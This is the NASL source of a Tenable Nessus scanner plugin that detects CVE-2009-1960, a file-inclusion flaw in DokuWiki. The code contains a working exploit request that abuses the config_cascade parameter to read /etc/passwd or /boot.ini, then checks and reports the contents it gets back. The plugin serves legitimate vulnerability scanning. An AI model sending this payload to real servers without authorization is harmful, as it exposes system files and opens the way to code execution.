#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(38926);
  script_version("$Revision: 1.11 $");
 script_cvs_date("$Date: 2015/09/24 21:08:38 $");

  script_cve_id("CVE-2009-1960");
  script_bugtraq_id(35095);
  script_osvdb_id(54740);
  script_xref(name:"EDB-ID", value:"8781");
  script_xref(name:"EDB-ID", value:"8821");
  script_xref(name:"Secunia", value:"35218");

  script_name(english:"DokuWiki config_cascade Parameter Remote File Inclusion");
  script_summary(english:"Attempts to read a local file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains PHP script that is affected by a remote
file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote installation of DokuWiki fails to sanitize user input to the
'config_cascade' parameter array before using it in 'inc/init.php' to
include PHP code.  Provided PHP's 'register_globals' setting is enabled,
an attacker can leverage this flaw to view files on the local host or to
execute arbitrary PHP code, possibly taken from third-party hosts.");
  script_set_attribute(attribute:"see_also", value:"http://bugs.splitbrain.org/index.php?do=details&task_id=1700");
  script_set_attribute(attribute:"solution", value:
"Either disable PHP's 'register_globals' setting or upgrade to
DokuWiki 2009-02-14b or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');
  script_cwe_id(94);

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/05/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("dokuwiki_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/dokuwiki");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install
os = get_kb_item("Host/OS");
if (os)
{
  if("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";

install = get_kb_item(string("www/", port, "/dokuwiki"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Loop through files to look for.
  foreach file (files)
  {
    url = string(
      dir, "/doku.php?",
      "config_cascade[main][default][]=",
      file
    );

    #Try to exploit the issue
    res = http_send_recv3(port:port, method:"GET", item:url);
    if (isnull(res)) exit(0);

    # There's a problem if we see the expected contents.
    body = res[2];
    file_pat = file_pats[file];
    if (egrep(pattern:file_pat, string:body))
    {
      if (report_verbosity > 0)
      {
        if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

        report = string(
          "\n",
          "Nessus was able to exploit the issue to retrieve the contents of\n",
          "'", file, "' on the remote host using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          contents = body;
          if ("  <!DOCTYPE" >< contents) contents = contents - strstr(body, "  <!DOCTYPE");

          report += string(
            "\n",
            "Here are its contents :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            contents,
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port:port);

      exit(0);
    }
  }
}
